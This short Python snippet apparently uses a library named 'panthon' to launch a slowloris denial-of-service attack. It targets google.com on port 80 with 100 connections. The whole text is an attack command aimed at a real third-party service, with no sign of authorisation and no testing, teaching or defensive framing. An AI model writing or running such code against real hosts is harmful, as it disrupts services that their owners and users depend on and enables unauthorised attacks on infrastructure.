from panthon import DoSAttack

dos = DoSAttack()
dos.slowloris_attack(target="google.com", target_port=80, num_connections=100)
